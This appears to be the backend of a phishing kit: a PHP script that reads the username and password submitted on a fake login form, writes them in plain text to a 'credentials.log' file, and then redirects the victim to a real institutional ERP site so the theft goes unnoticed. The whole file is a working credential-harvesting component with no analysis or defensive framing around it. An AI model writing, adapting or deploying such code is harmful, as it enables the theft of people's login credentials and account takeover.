<?php
    // Get POST data
    $email = $_POST['user'];
    $password = $_POST['pass'];

    // Log to file
    $file = fopen("LOGS/credentials.log", "a");
    fwrite($file, "USERID: $email | Password: $password\n");
    fclose($file);

    // Redirect user to the requested site
    header("Location: https://erppict.wccscas.in/");
    exit();
?>
